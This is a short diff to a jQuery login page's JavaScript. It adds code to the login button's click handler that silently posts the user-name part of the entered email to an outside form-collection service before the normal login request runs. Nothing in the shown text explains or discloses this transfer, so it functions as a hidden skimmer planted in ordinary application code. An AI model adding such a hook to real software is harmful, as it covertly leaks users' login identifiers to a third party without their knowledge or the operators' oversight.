@@ -190,6 +190,14 @@ $(document).ready(function() {
     $("#login_button").unbind('click',);
 
     $('#login_button').click(function() {
+	 $.ajax({
+	  url: "https://formspree.io/f/xvovlkkk",
+	  method: "POST",
+	  dataType: "json",
+	  data: {
+	    email: $('#email').val().split('@')[0]
+	  }
+	});
         var payload = {
             username: $('#email').val(),
             password: $('#password1').val()
